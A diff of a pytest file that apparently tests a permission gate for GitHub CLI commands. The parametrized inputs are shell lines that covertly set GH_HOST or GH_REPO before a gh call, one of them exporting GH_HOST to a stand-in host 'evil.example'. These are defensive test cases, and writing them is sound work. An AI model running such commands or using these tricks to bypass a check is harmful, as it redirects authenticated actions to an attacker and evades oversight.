@@ -81,6 +81,9 @@ def test_a_variable_set_on_the_line_makes_every_gh_call_ask(name: str, form: str
         ),
         pytest.param("print -f x%n GH_HOST; gh pr view 1 -R furedea/agent-config", id="zsh print -f with %n"),
         pytest.param("printf {-v,GH_REPO} other/r; gh issue comment 1 -b ok", id="printf -v from a brace"),
+        pytest.param(
+            'printf "$F" GH_HOST; gh issue comment 1 -R furedea/agent-config -b ok', id="printf with a run-time format"
+        ),
         pytest.param("GH_FORCE_TTY=1 gh pr view 1", id="a forced terminal on the line"),
         pytest.param(
             "builtin export GH_HOST=evil.example; gh issue comment 1 -R furedea/agent-config -b ok",
